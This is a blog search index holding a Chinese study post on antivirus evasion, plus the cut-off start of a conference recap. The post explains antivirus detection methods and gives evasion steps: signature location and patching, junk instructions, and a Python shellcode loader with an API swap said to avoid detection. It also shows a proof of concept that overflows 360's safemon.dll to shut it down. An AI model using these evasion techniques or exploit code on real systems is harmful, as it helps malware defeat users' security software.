<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>免杀(未完结)</title>
      <link href="/posts/bcad49a1d479/"/>
      <url>/posts/bcad49a1d479/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/14215">https://xz.aliyun.com/t/14215</a></p><p>基础汇编</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push压栈，将数据放入栈中，先进后出</span><br></pre></td></tr></table></figure><p>32位免杀好做，64位基线高</p><p>汇编指令学习</p><p>特征码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">病毒特征码。我们需要在病毒的二进制代码中提取一部分作为病毒特征。但是病毒程序不能用这种方法，即从程序入口进行提取，这样一来病毒程序和普通的程序的检测结果没有分别。因此计算机病毒的特征码需要把病毒程序域一般程序区分开来。将唯一标识或一类多态病毒作为计算机病毒程序的指纹。如果随意选取一段二进制代码作为病毒特征码很可能出现误报</span><br><span class="line"></span><br><span class="line">需要满足以下要求:</span><br><span class="line">    不能从数据区提取，数据区内容容易改变，不保险，最好做在不可变字符上</span><br><span class="line">    在特征码唯一的情况下，尽量使得特征码短小精悍，减少复杂度，提高检测效率</span><br><span class="line">    特征码一定不能匹配到普通程序，比如选取病毒入口的二进制代码，必然出现误报</span><br><span class="line">    特征码应该在<span class="number">64</span>个字节以内</span><br></pre></td></tr></table></figure><p>提取方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">计算校验和(专杀软件会多一些)</span><br><span class="line">    简单快速，但是会导致特征库庞大</span><br><span class="line">提取特征字符串</span><br><span class="line">    能识别某个病毒特有字符串，但是需要耗费比较多的扫描时间</span><br></pre></td></tr></table></figure><p>工具集</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollydbg</span><br><span class="line">c32asm</span><br></pre></td></tr></table></figure><h2 id="杀软主流查杀原理和方式"><a href="#杀软主流查杀原理和方式" class="headerlink" title="杀软主流查杀原理和方式"></a>杀软主流查杀原理和方式</h2><p>特征码和花指令</p><p>修改特征码让杀软程序无法识别为病毒软件。</p><p>花指令是程序中的无用代码。杀毒软件对木马进行反汇编时木马代码不会正常显示，。利用堆栈平衡，让加花指令后堆栈一样</p><p>木马彩衣(金色鱼锦衣)</p><p>替换法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">move ebp,wsp</span><br><span class="line"><span class="keyword">add</span> esp,<span class="number">-0</span>C</span><br><span class="line"><span class="keyword">add</span> esp,<span class="number">0</span>C</span><br><span class="line">mov eax，原入口</span><br><span class="line">push eax</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>比如在壳这里进行替换各个寄存器存的数据</p><p><img src="/./../image/%E5%85%8D%E6%9D%80-%E6%9C%AA%E5%AE%8C%E7%BB%93/1730164380104-3.png" alt="img"></p><p>壳上壳的免杀</p><p>跳转进行多层跳转</p><p>比较进行比较回来</p><p>确定特征码位置，对某一段进行nop，看是否进行查杀 </p><p>单步挂上函数后，将打上断点，开启杀软，看是否查杀</p><p>样本判断</p><p><img src="/./../image/%E5%85%8D%E6%9D%80-%E6%9C%AA%E5%AE%8C%E7%BB%93/1730164380089-1.png" alt="img"></p><p>绝绝子病毒：</p><p>磁碟机病毒</p><h2 id="主流杀软查杀原理"><a href="#主流杀软查杀原理" class="headerlink" title="主流杀软查杀原理"></a>主流杀软查杀原理</h2><p>病毒查杀方式：行为和云查杀、静态查杀</p><p>静态查杀：特征码识别到，然后对文件进行特征匹配</p><p>云查杀：对文件内容以及行为进行检测。提取特征</p><p>行为查杀(动态查杀)：对行为进行检测</p><p>可构建行为库进行动态查杀</p><p>统计学规律–》建立特征学习库–》进行动态查获取</p><h3 id="监测技术"><a href="#监测技术" class="headerlink" title="监测技术"></a>监测技术</h3><p>内存读取监测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">监控所有进程，扫描内存</span><br><span class="line">挂钩子进行监控，监控系统创建，在系统回调处进行监控，然后对文件进行分析，如果有问题就删掉</span><br></pre></td></tr></table></figure><p>写入文件监测</p><p>对于写入磁盘的文件进行扫描</p><p>网页安全监测</p><p>监测是否存在网络攻击和不安全下载</p><p>邮箱附件监测</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于电子邮箱的附件进行病毒扫描</span><br><span class="line">加密传递会好一点</span><br></pre></td></tr></table></figure><p>进程行为监测</p><p>沙盒模式即为进程行为监测，监测进程各种行为，对敏感操作进行报警</p><h3 id="机器学习识别技术"><a href="#机器学习识别技术" class="headerlink" title="机器学习识别技术"></a>机器学习识别技术</h3><p>通过深度学习技术进行识别病毒特征，不仅是静态样本的二进制分析，可以运用到沙盒动态行为分析中</p><p>机器学习识别技术围绕病毒特征码，调用功能和触发行为，运用在沙盒动态分析中</p><h3 id="被杀的python代码"><a href="#被杀的python代码" class="headerlink" title="被杀的python代码"></a>被杀的python代码</h3><p>这是不免杀的，使用如下代码进行测试，使用pyinstaller生成可执行的exe文件。pyinstaller生成exe文件过程不会校验代码是否可执行，所以可以通过注释的方式一行行测试具体是什么代码报毒。</p><p>Shellcode代码不会触发告警，代码中的 VirtualAlloc、RtlMoveMemory函数同时使用时会触发告警。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">def exec_shellcode(shellcode):</span><br><span class="line">    # shellcode <span class="operator">=</span> bytearray(shellcode)</span><br><span class="line">    # ctypes.windll.kernel32.VirtualAlloc.restype <span class="operator">=</span> ctypes.c_uint64</span><br><span class="line">    ptr <span class="operator">=</span> ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                              ctypes.c_int(len(shellcode)),</span><br><span class="line">                                              ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                              ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    #buf <span class="operator">=</span> (ctypes.c_char <span class="operator">*</span> len(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),</span><br><span class="line">                                         buf,</span><br><span class="line">                                         ctypes.c_int(len(shellcode)))</span><br><span class="line">    # handle <span class="operator">=</span> ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    #                                              ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    #                                              ctypes.c_uint64(ptr),</span><br><span class="line">    #                                              ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    #                                              ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    #                                              ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    # ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(<span class="number">-1</span>))</span><br><span class="line">def main():</span><br><span class="line">    buf <span class="operator">=</span>  b&quot;&quot;</span><br><span class="line">    shellcode <span class="operator">=</span> buf</span><br><span class="line">    exec_shellcode(shellcode)</span><br><span class="line">if __name__ <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p> 这里会被杀掉</p><p>将RtlMoveMemory换成RtlCopyMemory就不会</p><p>基本32位的杀软防御会更强，而不是64位</p><p>vmware14会更好用</p><h2 id="沙箱原理"><a href="#沙箱原理" class="headerlink" title="沙箱原理"></a>沙箱原理</h2><p>沙箱是基于windows下的容器技术，构建在windows操作系统内核上，更轻量化的虚拟方案，专门用于安全隔离运行应用程序</p><h3 id="windows沙盒"><a href="#windows沙盒" class="headerlink" title="windows沙盒"></a>windows沙盒</h3><p>动态生成图像，基本映像技术windows启动沙盒，不需要单独的副本</p><p>大多数操作系统文件不可变，并且与沙盒windows共享。操作系统文件一小部分可变，不能共享。因此沙盒基本映像包含这些文件的一小部分副本。完整的windows图像可通过主机上的可共享不可变文件和可变文件的完整副本组合构建。通过此方案windows沙盒具有启动完整windows安装，无需下载或存储其他windows</p><p>在windows沙盒前，动态基本映像为30MB压缩包。安装后，基本映像将占500MB磁盘空间</p><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>传统vm会静态分配主机内存，当资源需求发生变化的时候，经典vm具有用于调整资源需求的有限机制。另一方面，容器与主机协作以动态确认如何分配主机资源。此方法类似于进程通常在主机上占用内存的方式。如果主机有内存压力，可以从容器回收内存，就像进程回收内存一样。</p><h3 id="内存共享"><a href="#内存共享" class="headerlink" title="内存共享"></a>内存共享</h3><p>由于windows沙盒运行与主机相同的操作系统映像，因此已经增强为通过称为直接映射的技术将相同的物理内存也用于操作系统二进制文件的主机。例如当ntdll.dll*加载到沙盒中的内存中时，它将使用与主机上加载的二进制文件相同的物理页。与传统的VM相比，主机和沙盒之间的内存共享会导致较小的内存占用，而不会损害有价值的主机密钥</p><h3 id="集成内核计划任务"><a href="#集成内核计划任务" class="headerlink" title="集成内核计划任务"></a>集成内核计划任务</h3><p>对于普通虚拟机，microsoft虚拟机监控程序中运行的虚拟处理器的计划。windows沙盒使用名为“集成计划”的技术，允许主机计划程序决定沙盒何时获取CPU周期</p><p>windows沙盒中采用唯一策略，该策略允许像主机线程一样计划沙盒的虚拟化处理器。此方案中，主机的高优先级任务可以i抢占不那么重要的工作，最重要的工作优先进行，无论工作位于主机还是容器中</p><h3 id="WDDM-GPU-虚拟化-需要深入研究"><a href="#WDDM-GPU-虚拟化-需要深入研究" class="headerlink" title="WDDM GPU 虚拟化(需要深入研究)"></a><strong>WDDM</strong> <strong>GPU</strong> <strong>虚拟化(需要深入研究)</strong></h3><p>硬件加速呈现是提供流畅且响应迅速的用户体验的关键，尤其是对于图像密集的用例。microsoft与图形状生态系统合作伙伴合作，将新型图形虚拟化直接集成到directx和windows display driver model中</p><p>此功能允许沙盒内运行的程序与主机上运行的应用程序竞争GPU资源</p><p>做一个wddm虚拟化的驱动，借助泄露的签名，那么可能就能长时间驻留在操作系统中，可能能建立其非常隐蔽的信息通信信道</p><p><img src="/./../image/%E5%85%8D%E6%9D%80-%E6%9C%AA%E5%AE%8C%E7%BB%93/1730164380089-2.png" alt="img"></p><h2 id="传统杀软检测原理"><a href="#传统杀软检测原理" class="headerlink" title="传统杀软检测原理"></a>传统杀软检测原理</h2><p>思考IFEO映像劫持</p><p><a href="https://zhuanlan.zhihu.com/p/96504762">https://zhuanlan.zhihu.com/p/96504762</a></p><p>IFEO好像也可以做对病毒的劫持，来阻止病毒运行</p><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">扫描压缩包技术：对压缩包按和封装文件做分析检查的技术</span><br><span class="line">程序篡改防护：避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑</span><br><span class="line">修复技术：即是对恶意程序所损坏的文件进行还原</span><br><span class="line">急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒</span><br><span class="line">智能扫描：扫描最常见的磁盘，系统关键位置，耗时较短</span><br><span class="line">全盘扫描：扫描电脑全部磁盘，耗时较长</span><br><span class="line">勒索软件防护：保护电脑中文件不被黑客恶意加密</span><br><span class="line">开机扫描：当电脑开机时自动扫描，扫描压缩文档和可能不需要的程序</span><br></pre></td></tr></table></figure><h3 id="监控技术"><a href="#监控技术" class="headerlink" title="监控技术"></a>监控技术</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内存监控：当发现内存中存在病毒时，主动报警，监控所有进程，读取到内存中的文件，监控内存的网络数据</span><br><span class="line">文件监控：当发现磁盘中的文件中存在病毒，或者被病毒感染则主动报警</span><br><span class="line">邮件监控：发现电子邮件附件存在病毒时进行拦截</span><br><span class="line">网页防护：组织网络攻击和不安全下载</span><br><span class="line">行为防护：提醒用户可疑的应用程序行为</span><br></pre></td></tr></table></figure><p>进程行为监测(沙盒)</p><p>通过病毒研究，将病毒共同的特殊行为进行监控</p><p>优点：可能防住未知病毒，</p><p>缺点：误报，不能识别病毒名称，需要用户用知识判断</p><p>主动防御：</p><p>不需要特征码支持，只要能扫描到目标的行为，就按照预先的迫使进行清除。核心是让机器自己有判断是否为病毒的智能</p><p>行为加算法模式</p><p>机器学习：</p><p>不仅可以做静态样本的二进制分析，也可以用沙箱动态行为分析。内容加行为</p><p><strong>机器学习****恶意样本识别</strong></p><h2 id="从特征码角度去测试杀软逻辑"><a href="#从特征码角度去测试杀软逻辑" class="headerlink" title="从特征码角度去测试杀软逻辑"></a>从特征码角度去测试杀软逻辑</h2><p>360进行脱壳的能力会比火绒强，360使用虚拟机脱壳引擎(VUE)进行脱壳。火绒使用vm的脱壳方式，对变形壳和可疑的区段没有识别能力。火绒强在主动防御，在市面上仅次于360</p><p>加壳，压缩、变形、使得特征码完全不同</p><p>脱壳两种思路</p><p>硬脱壳：写出逆向算法</p><p>动态脱壳：加壳程序运行的时候会自行脱壳，抓取运行时在内存中的镜像，再构建成标准的执行文件</p><p>虚拟机脱壳引擎(VUE)技术</p><p>给病毒制造一个仿真环境，让病毒自己脱壳</p><p>QVM人工智能引擎，从海量病毒样本数据中归纳出一套智能算法，无需分析病毒静态特征，无需分析病毒行为，但是病毒监测率奇高</p><p>特征码识别和人工智能算法结合、主动防御技术和四引擎查杀的防杀结合</p><p>最好是两个引擎都用吧</p><p>如果将木马中的一些jmp上下修改一两位，如果说没有强校验，那么还是能进行运行的</p><h3 id="常见特征码定位"><a href="#常见特征码定位" class="headerlink" title="常见特征码定位"></a>常见特征码定位</h3><p>常见工具有CCL、MYCCL。大致原理是分割文件，将分割部分填入数据。如果扫描该部分不报警。则特征码在这个部分。知道找到这个部分。不同工具区别是使用的分割算法不同，查找特征码的效果不同。</p><p>但定位有运气问题，每次定位位置不同</p><p>VirTest是区别于CCL、MYCCL的工具。清除杀软判断链路的其中一环进行免杀</p><p>定位到数据，导致程序不能运行</p><p>大小写修改判断，字符串位置调换，无关数据随意替换</p><p>整数不影响结构的情况下，替换值，清零</p><p>地址，不能修改、具体看实际情况</p><p>PE头数据，无用数据清零或修改，有用数据看情况修改</p><p>代码</p><p>如果特征码定位到代码，在不改变程序功能基础上，应用各种方法修改</p><p>等价替换汇编代码，如mov、eax，0可以替换为xor、eax、eax，直接结果相同，二进制代码不同</p><p>交换代码顺序，在不影响逻辑的情况下代码块一位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址</p><p>最后，终极修改方法，找到访问数据的代码，直接修改代码访问数据的地址，数据也可以放到其他地址了，如同修改源码一样，但是更难</p><h4 id="源码免杀的逻辑原理"><a href="#源码免杀的逻辑原理" class="headerlink" title="源码免杀的逻辑原理"></a>源码免杀的逻辑原理</h4><p>这里是针对有源码的，方法简单</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mian中屏蔽所有代码，编译，扫描，不报就<span class="number">2</span>，如果报就<span class="number">5</span></span><br><span class="line">放开一层(可以多层、二分也可以)函数，编译，扫描。不报的话重复<span class="number">2</span>。直到定位到某个函数或者多个函数，进入<span class="number">3</span></span><br><span class="line">在函数内部屏蔽部分代码(二分)，编译，扫描。不报，重复<span class="number">2</span></span><br><span class="line">直到定位某段代码(无自定义内部调用)，特征码在此</span><br><span class="line">如果有附加数据，或者资源存储的文件，就单独检查该文件或者数据。从方法<span class="number">1</span>开始。如果没有去找PE头</span><br></pre></td></tr></table></figure><h2 id="安全软件分析"><a href="#安全软件分析" class="headerlink" title="安全软件分析"></a>安全软件分析</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">360</span></span><br><span class="line">qq电脑管家(腾讯电脑管家)</span><br><span class="line">火绒</span><br></pre></td></tr></table></figure><p>主动防御是需要重点关注的</p><p>监控进程、实时发现和拦截恶意程序、病毒查杀能力、自我保护能力</p><p>市面上的病毒查杀软件都需要过VB100才能上市</p><h3 id="TAV"><a href="#TAV" class="headerlink" title="TAV"></a>TAV</h3><p>TAV杀毒后能还原一部分被病毒破坏的注册表和文件，内存查杀也不错，可以扫描内存、创建和病毒一样互斥，防止病毒再次运行</p><p>缺点是免杀简单，由于使用字符串明文检测，很容易分析病毒库或者是MYCCL等黑盒免杀。另一方面，TAV的效率低，包括特征数据结构若，特征复用等。</p><p>病毒库结构：</p><p>virinfo.def:名称表，包括壳名、包名、特征名C++</p><p>structVirinfo{</p><p>DWORD dwID;</p><p>BYTE btLength;</p><p>Char VirName[btLength];</p><p>};</p><p>病毒库更新：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接更新拓展名为.def病毒库，适用于查杀现有引擎可以支持的木马和病毒</span><br><span class="line">更新替换tpktt.dll，适用于现有引擎无法解决的复杂样本，将特征和查杀方式通过分析员写代码实现，然后整个引擎进行替换，类似于专杀方式</span><br></pre></td></tr></table></figure><p>0x02 PE查杀过程逆向分析：</p><p>病毒库描述：</p><p> virpeXX.def:（PE库）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct VirpeHeader</span><br><span class="line">&#123;</span><br><span class="line">WORD wUnknown;</span><br><span class="line">DWORD dwSize;</span><br><span class="line">WORD wTablelCount; </span><br><span class="line">WORD wdMaskCount; <span class="operator">/</span><span class="operator">/</span>表示共有多少条PE特征</span><br><span class="line">WORD wdUnknown4;</span><br><span class="line">DWORD dwTable1Off;</span><br><span class="line">DWORD dwTable2Off;</span><br><span class="line">DWORD dwTable3Off;</span><br><span class="line">DWORD dwTable4Off;</span><br><span class="line">DWORD dwTable5Off; <span class="operator">/</span><span class="operator">/</span>传统特征</span><br><span class="line">DWORD dwTable6Off; <span class="operator">/</span><span class="operator">/</span>多模式特征</span><br><span class="line">&#125;</span><br><span class="line">struct Sig <span class="operator">/</span><span class="operator">/</span>特征结构</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRecordID;<span class="operator">/</span><span class="operator">/</span>特征ID，用于关联特征名</span><br><span class="line">DWORD dwOffset;<span class="operator">/</span><span class="operator">/</span>特征偏移，用于定位病毒代码具体位置</span><br><span class="line">BYTE btLength;<span class="operator">/</span><span class="operator">/</span>特征长度，用于扫描匹配病毒代码长度</span><br><span class="line">BYTE btOffsetBaseAddress;<span class="operator">/</span><span class="operator">/</span>特征基地址，用于定位特征起始地点</span><br><span class="line">BYTE btVirMask[btLength];<span class="operator">/</span><span class="operator">/</span>病毒特征具体内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态查杀方式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制全文匹配(二进制特征存放在virpe01.def库解密后的tbl5中)将数十字节的病毒代码二进制，记录在病毒库中，与待检测样本进行全文匹配</span><br><span class="line"></span><br><span class="line">多模匹配(多模特征存放在tbl6中)</span><br><span class="line">将恶意程序的明显字符串信息提取出，记录在病毒库中，与待检测样本进行多模匹配</span><br></pre></td></tr></table></figure><p>特征的编号、特征的名称、特征的偏移、特征的长度、特征的内容</p><h2 id="查杀引擎功能分析"><a href="#查杀引擎功能分析" class="headerlink" title="查杀引擎功能分析"></a>查杀引擎功能分析</h2><p>杀掉进程</p><p>内存分析</p><p>内存扫描</p><p>匹配到指定的进程和内存串，就终止进程</p><p>匹配文件是否存在</p><p>匹配几层子目录，如果没有就跳过</p><p>创建一个acl访问控制域，这个域上设置system权限用户</p><p>创建一个与病毒相同的互斥体，防止病毒再次运行</p><p> 将杀软杀掉后，创建一个互斥体，让病毒运行不起来，根据难查杀的病毒一起变换</p><p>但是现在病毒会随机互斥体名称，记录在某个位置，如果又创建过了就不执行了</p><p>内存清理</p><p>将虚表里面的结构体成员初始化</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">signed <span class="type">int</span> __thiscall sub_1012E1D0(<span class="type">int</span> this)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="operator">*</span>(_DWORD <span class="operator">*</span>)(this <span class="operator">+</span> <span class="number">4</span>)<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="operator">*</span>(_DWORD <span class="operator">*</span>)(this <span class="operator">+</span> <span class="number">4</span>)<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="operator">*</span>(_DWORD <span class="operator">*</span>)(this <span class="operator">+</span> <span class="number">4</span>)<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    memset((void <span class="operator">*</span>)(this <span class="operator">+</span> <span class="number">12</span>),<span class="number">0</span>,<span class="number">0x208</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BMP字符串多模式匹配：</p><p> 可以看</p><p><a href="https://www.zhihu.com/question/21923021">https://www.zhihu.com/question/21923021</a></p><p>实际上是需要用到更优于内存效率的方法，大量并发是否能执行好，是否能顺利解决问题</p><p>虚拟机检测：</p><p>虚拟机里面模拟了ntdll、kernel32、gdi32、user32、advapi32、shell32、wsock32、ole32、oleaut32、msvcrt、version、urlmon几个系统dll，这些是木马经常会调用的dll，模拟x64或86的虚拟环境，模拟进程网络、注册表、外壳等环境内的组件，加载之后保证不能崩溃。</p><p>少用经常用的一些函数，包括是导出函数</p><p>少用模块的一些导出函数</p><h2 id="数字卫士溢出漏洞分析"><a href="#数字卫士溢出漏洞分析" class="headerlink" title="数字卫士溢出漏洞分析"></a>数字卫士溢出漏洞分析</h2><p>360全家桶</p><p>360杀毒、360安全卫士、小红伞、360系统急救箱</p><p>参考</p><p><a href="https://blog.csdn.net/aluo3002/article/details/102028296">https://blog.csdn.net/aluo3002/article/details/102028296</a></p><p>通过分析RAT payload运行后可以关闭360，根据rat运行后能发现只是运行了几个小部分</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="operator">&lt;</span>iostream<span class="operator">&gt;</span></span><br><span class="line">#include <span class="operator">&lt;</span>windows.h<span class="operator">&gt;</span></span><br><span class="line">#include <span class="operator">&lt;</span>stdio.h<span class="operator">&gt;</span></span><br><span class="line">#include &quot;buffer.h&quot;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()&#123;</span><br><span class="line">HMODULE h360 <span class="operator">=</span>GetModuleHandle(TEXT(&quot;safemon.dll&quot;));</span><br><span class="line"><span class="type">int</span> i <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i <span class="operator">=</span> <span class="number">0</span>; i<span class="operator">&lt;</span><span class="number">0x30000</span>; i<span class="operator">+</span><span class="operator">+</span>)</span><br><span class="line">&#123;</span><br><span class="line">if (memcmp((BYTE <span class="operator">*</span>)(h360<span class="operator">+</span>i), &quot;\x83\xEC\x10\x56\x8D\x44\x24\x04\x50&quot;,<span class="number">9</span>)<span class="operator">=</span><span class="operator">=</span><span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">         break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (i<span class="operator">=</span><span class="operator">=</span><span class="number">0x30000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">FARPROC funcGet360HWND <span class="operator">=</span> (FARPROC)(h360<span class="operator">+</span>i);</span><br><span class="line">HWND hWnd <span class="operator">=</span> (HWND)funcGet360HWND();</span><br><span class="line">COPYDATASTRUCT cpdata;</span><br><span class="line">cpdata.dwData <span class="operator">=</span> <span class="number">0x4d47534d</span>;</span><br><span class="line">cpdata.cbData <span class="operator">=</span> <span class="number">0x1000</span>;</span><br><span class="line">cpdata.lpData <span class="operator">=</span> msgbuf;  <span class="operator">/</span><span class="operator">/</span>长度<span class="number">0x1000</span>字节的随即数据，其中不能有连续\x00\x00</span><br><span class="line">SendMessage(hWnd, WM_COPYDATA, <span class="keyword">NULL</span>,(LPARAM)<span class="operator">&amp;</span>cpdata);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其作用是找到Q360SafeMonClass的窗口句柄。找到这段代码后将执行这段代码来获得窗口句柄。</p><p>不用findwidow是怕直接找找不到。</p><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>使用windbg，开双机调试，切换360到hookport上，定位到koface，在此处头处，把头换成ret</p><p>关闭360自我保护，就能直接进行调试了</p><p>safemon.dll是图形页面的支持dll，每个图形界面都会去加载这个dll，从这个dll中发送消息，使得safemon.dll以为我的输入为一个图像界面而去加载，能执行命令。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024SDC与GEEKCON参会总结</title>
      <link href="/posts/5dd43dde7349/"/>
      <url>/posts/5dd43dde7349/</url>
      
        <content type="html"><![CDATA[<p>这次的会议，见了禅叁师傅、默文师傅、gosh师傅、henry大师傅，xsh大师傅，还有几位师傅。</p><p>禅叁师傅人挺好的，带我了解了一下几位师傅。默文和gosh师傅很友好，henry、xsh大师傅很厉害。除此之外我一无所知，我只知道师傅们很强，但是我不知道师傅们为什么很强，我也想很强。</p><p>这次大会我分享一下我的收获吧。</p><p>首先去参加大会肯定是有好处的，更多方面是开拓视野。哦，原来前沿的大牛是在研究这些东西啊，然后感叹一下，他们好强啊。</p><p>sdc更多是告诉我，研究者在研究什么。geekcon告诉我，研究者研究的这些能干嘛</p><h3 id="sdc"><a href="#sdc" class="headerlink" 